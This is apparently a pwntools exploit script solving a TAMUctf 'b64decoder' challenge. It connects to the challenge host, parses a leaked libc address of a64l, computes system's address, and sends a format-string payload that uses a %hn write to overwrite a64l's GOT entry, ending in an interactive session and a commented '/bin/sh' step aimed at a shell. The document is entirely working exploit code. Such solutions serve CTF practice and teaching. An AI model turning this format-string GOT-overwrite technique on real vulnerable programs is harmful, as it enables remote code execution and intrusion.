from pwn import *
import re

libc = ELF('libc.so.6')
elf = ELF('b64decoder')
addr_rva_a64l = libc.symbols['a64l']
addr_rva_system = libc.symbols['system']
addr_got_a64l = elf.got['a64l']

p = remote('challenges.tamuctf.com', 2783)
#p = process('b64decoder')


recv = p.recvuntil('name!  ')

print recv


pt = re.compile('[a-f0-9]{7,8}') #get a64l address
res = pt.findall(recv)

addr_libc_a64l = int(res[0],16)
addr_base = addr_libc_a64l - addr_rva_a64l
addr_got_system = addr_base + addr_rva_system


#overwrite low 2 bytes
fir = addr_got_system & 0xffff


print 'low bytes of system: ' + hex(fir)
print 'got of a64l: ' + hex(addr_got_a64l)

payload = '%{0}x%AA$hn'.format(fir)
payload += 'a'*(4-len(payload)%4)
payload += p32(addr_got_a64l)
payload = payload.replace('AA', str(70+len(payload)/4))
print 'payload: ' + payload
print 'payload: ' + payload[-4:].encode('hex')
print 'len: ' + str(len(payload))
raw_input()


with open('payload', 'wb') as f:
	f.write(payload)
p.sendline(payload)
print p.recvrepeat(0.2)
print hex(addr_got_a64l)
print '\n\n\n'

'''
p.recvuntil('decoded: ')
p.sendline('/bin/sh')
'''



p.interactive()
